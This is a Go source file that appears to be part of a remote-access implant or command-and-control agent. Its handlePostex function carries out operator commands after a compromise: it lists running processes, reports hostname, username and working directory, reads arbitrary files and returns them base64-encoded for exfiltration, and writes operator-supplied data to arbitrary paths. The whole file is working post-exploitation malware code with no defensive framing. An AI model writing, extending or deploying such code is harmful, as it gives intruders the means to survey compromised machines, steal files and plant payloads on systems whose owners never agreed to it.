package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
)

func handlePostex(cmd string) string {
	op := strings.TrimPrefix(cmd, "__px:")
	switch {
	case op == "ps":
		if runtime.GOOS == "windows" {
			out, err := exec.Command("tasklist").CombinedOutput()
			if err != nil {
				return "Error: " + err.Error()
			}
			text := string(out)
			if len(text) > 8000 {
				text = text[:8000]
			}
			return text
		}
		entries, err := os.ReadDir("/proc")
		if err != nil {
			return "Error: " + err.Error()
		}
		var rows []string
		for _, e := range entries {
			if len(rows) >= 200 {
				break
			}
			name := e.Name()
			if name == "" || name[0] < '0' || name[0] > '9' {
				continue
			}
			comm, _ := os.ReadFile("/proc/" + name + "/comm")
			rows = append(rows, name+" "+strings.TrimSpace(string(comm)))
		}
		if len(rows) == 0 {
			return "Error: no process list"
		}
		return strings.Join(rows, "\n")
	case op == "recon":
		host, _ := os.Hostname()
		u, _ := user.Current()
		name := ""
		if u != nil {
			name = u.Username
		}
		cwd, _ := os.Getwd()
		return fmt.Sprintf("host=%s user=%s cwd=%s", host, name, cwd)
	case strings.HasPrefix(op, "download:"):
		path := strings.TrimPrefix(op, "download:")
		info, err := os.Stat(path)
		if err != nil || info.IsDir() {
			return "Error: not a file"
		}
		if info.Size() > 1024*1024 {
			return "Error: file too large"
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return "Error: " + err.Error()
		}
		return "FILE:" + base64.StdEncoding.EncodeToString(data)
	case strings.HasPrefix(op, "upload:"):
		rest := strings.TrimPrefix(op, "upload:")
		path, b64, ok := strings.Cut(rest, ":")
		if !ok {
			return "Error: bad upload"
		}
		data, err := base64.StdEncoding.DecodeString(b64)
		if err != nil {
			return "Error: " + err.Error()
		}
		if len(data) > 1024*1024 {
			return "Error: file too large"
		}
		if err := os.WriteFile(path, data, 0600); err != nil {
			return "Error: " + err.Error()
		}
		return fmt.Sprintf("uploaded %d bytes", len(data))
	default:
		return "Error: unknown postex op"
	}
}
